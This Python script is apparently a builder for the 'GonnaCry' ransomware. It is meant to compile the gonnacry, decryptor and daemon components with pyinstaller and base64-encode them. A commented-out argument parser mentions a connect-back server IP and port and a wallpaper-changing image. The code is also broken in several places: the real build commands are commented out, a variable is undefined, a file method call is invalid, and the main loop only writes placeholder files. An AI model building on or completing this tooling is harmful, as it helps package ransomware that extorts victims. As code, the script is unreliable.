#!/usr/bin/env python

import argparse
import base64, os, sys, subprocess, shutil, struct


""" 
parser = argparse.ArgumentParser(description='Build GonnaCry.', add_help=True)
parser.add_argument('-i', '--ip', type=str, required=True, metavar='[FILE]',
    help='Ip address of the server. GonnaCry will try to connect to')
parser.add_argument('-p', '--port', type=str, required=False, metavar='[FILE]',
    help='Port of the server.')
parser.add_argument('-I', '--img', type=str, required=False, metavar='[FILE]',
    help='Img to change wallpaper and display on GonnaCry execution.')
args = parser.parse_args()
 """


def error(s):
    raise FileNotFoundError(s)

def _build(program):
    command = 'pyinstaller -F --clean GonnaCry/{}.py -n {}'.format(program, program)
    sys.stderr.write(command + "\n")
    # # subprocess.check_output(command)
    # os.system(command)
    if not os.path.exists("dist"):
        os.mkdir("dist")

    with open('dist/{}'.format(program), 'wb') as f:
            buf = f.fileno()
            pack =  struct.pack("l",buf )
            pack_ =  struct.pack("256s",bytes(command, encoding="utf8"))
            f.write(pack)
            # output64 = base64.b64encode(ret)

    shutil.copy(f"dist/{program}", 'dist/base64{}'.format(program))
    os.remove(f"dist/{program}") 


def build(program):
    command = 'pyinstaller -F --clean GonnaCry/{}.py -n {}'.format(program, program)
    sys.stderr.write(command + "\n")
    # # subprocess.check_output(command)
    # os.system(command)

    try:
        with open('dist/{}'.format(program), 'w') as f:
            buf = f.getbuffer()
            output64 = base64.b64encode(ret)
    except:
        error('{} binary doesnt exist, compilation failed.'.format(program))

    with open('dist/base64{}'.format(program), 'wb') as f:
        shutil.copy
        f.write(output64)
    
    return output64


def build_gonnacry():
    _build('gonnacry')
    


def build_decryptor():
    return build('decryptor')


def build_daemon():
    return build('daemon')


def change_gonnacry_binaries():
    img = ''
    decryptor = ''
    daemon = ''

def clean_dist():
    command = ''


def main(count):
    i = 0 
    while len(os.listdir("dist")) < count:
        _build("gonnacry%d" % i) 
        i+=1

    # decryptor64 = build_gonnacry()
    # daemon64 = build_daemon()


if __name__ =='__main__':
    main(12)

